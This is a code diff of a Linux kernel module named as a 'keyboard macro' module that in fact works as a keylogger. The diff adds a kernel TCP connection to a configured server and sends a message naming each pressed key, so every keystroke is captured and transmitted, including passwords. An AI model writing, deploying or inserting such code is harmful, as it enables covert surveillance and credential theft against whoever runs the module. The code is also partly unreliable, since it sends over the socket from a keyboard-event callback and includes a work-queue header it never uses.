@@ -1,7 +1,7 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
-#include <linux/input.h> // defines standard keycodes
+#include <linux/input.h>
 #include <linux/hid.h>
 #include <linux/keyboard.h>
 #include <linux/uaccess.h>
@@ -9,14 +9,11 @@
 #include <linux/net.h>
 #include <linux/in.h>
 #include <linux/inet.h>
+#include <linux/workqueue.h>  // Work queue support
 
-#define SERVER_IP "localhost"
+#define SERVER_IP "127.0.0.1"
 #define SERVER_PORT 80
-
 #define BUFFER_SIZE 256
-static char key_buffer[BUFFER_SIZE];
-static int buffer_index = 0;
-
 #define MAX_KEYCODE 255
 
 static const char *keymap[MAX_KEYCODE + 1] = {
@@ -43,59 +40,47 @@ static const char *keymap[MAX_KEYCODE + 1] = {
     [KEY_INSERT] = "INSERT", [KEY_DELETE] = "DELETE",
 };
 
-static struct socket *sock = NULL;
+//static char key_buffer[BUFFER_SIZE];
+//static int buffer_index = 0;
+static struct socket *sock;
 static struct sockaddr_in s_addr;
 
-#include <linux/uio.h>  // For struct kvec
-
+// Function to send data to the server
 static int send_data_to_server(const char *data)
 {
-    int ret = 0;
+    struct kvec vec;
+    struct msghdr msg;
+    int ret;
+
+    memset(&msg, 0, sizeof(msg));
+    vec.iov_base = (void *)data;
+    vec.iov_len = strlen(data);
+
+    ret = kernel_sendmsg(sock, &msg, &vec, 1, strlen(data));
+    if (ret < 0) {
+        pr_err("Failed to send data: %d\n", ret);
+    }
 
     return ret;
 }
-
 
 static int keyboard_event(struct notifier_block *nb, unsigned long code, void *param)
 {
     struct keyboard_notifier_param *kp = param;
 
-    if (kp->down) {
-        if (kp->value < 0 || kp->value > MAX_KEYCODE) {
-            //pr_err("Invalid keycode: %d\n", kp->value);
-            return NOTIFY_OK;
-        }
-
+    if (kp->down && kp->value >= 0 && kp->value <= MAX_KEYCODE) {
         const char *key_char = keymap[kp->value];
-        if (!key_char) {
-            pr_info("Key event: unmapped keycode = %d\n", kp->value);
-            return NOTIFY_OK;
+        if (key_char) {
+            char message[BUFFER_SIZE];
+            snprintf(message, BUFFER_SIZE, "Key pressed: %s", key_char);
+            send_data_to_server(message);
+            pr_info("Data sent to server: %s", message);
         }
-
-        // Calculate the space left in the buffer
-        int space_left = BUFFER_SIZE - buffer_index - 1; // -1 for null terminator
-        int key_char_length = strlen(key_char);
-
-        if (key_char_length < space_left) {
-            strncat(key_buffer, key_char, space_left);
-            buffer_index += key_char_length;
-            key_buffer[buffer_index] = '\0';
-        } else {
-            send_data_to_server(key_buffer);
-            buffer_index = 0;
-            pr_info("Not enough space in key buffer\n");
-        }
-
-        pr_info("Keycode: %d, Letter: %s\n", kp->value, key_char);
     }
 
     return NOTIFY_OK;
 }
 
-// notifier_call: A function pointer to the callback function that should be called when the notification is triggered.
-// In this case, it's set to keyboard_event, which will run whenever a keyboard event is detected.
-
-// instance of notifier_block structure
 static struct notifier_block keyboard_nb = {
     .notifier_call = keyboard_event
 };
@@ -104,32 +89,30 @@ static int __init keyboard_macro_init(void)
 {
     int ret;
 
-    // Register the keyboard notifier
     ret = register_keyboard_notifier(&keyboard_nb);
     if (ret) {
         pr_err("Failed to register keyboard notifier\n");
         return ret;
     }
 
-    sock = (struct socket *)kmalloc(sizeof(struct socket),GFP_KERNEL); 
-
-    memset(&s_addr,0,sizeof(s_addr)); 
+    // Set up socket
+    memset(&s_addr, 0, sizeof(s_addr));
     s_addr.sin_family = AF_INET;
     s_addr.sin_port = htons(SERVER_PORT);
     s_addr.sin_addr.s_addr = in_aton(SERVER_IP);
 
-    ret = sock_create_kern(&init_net, AF_INET,SOCK_STREAM, IPPROTO_TCP, &sock);
-
+    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
     if (ret) {
         pr_err("Failed to create socket\n");
+        unregister_keyboard_notifier(&keyboard_nb);
         return ret;
     }
 
-    ret = kernel_bind(sock,(struct sockaddr *)&s_addr,sizeof(struct sockaddr_in));
-
+    ret = kernel_connect(sock, (struct sockaddr *)&s_addr, sizeof(s_addr), 0);
     if (ret) {
-        pr_err("Failed to bind socket\n");
+        pr_err("Failed to connect to server\n");
         sock_release(sock);
+        unregister_keyboard_notifier(&keyboard_nb);
         return ret;
     }
 
@@ -139,12 +122,9 @@ static int __init keyboard_macro_init(void)
 
 static void __exit keyboard_macro_exit(void)
 {
-    // Unregister the keyboard notifier
     unregister_keyboard_notifier(&keyboard_nb);
-
-    if (sock) {
+    if (sock)
         sock_release(sock);
-    }
 
     pr_info("Keyboard macro module unloaded\n");
 }
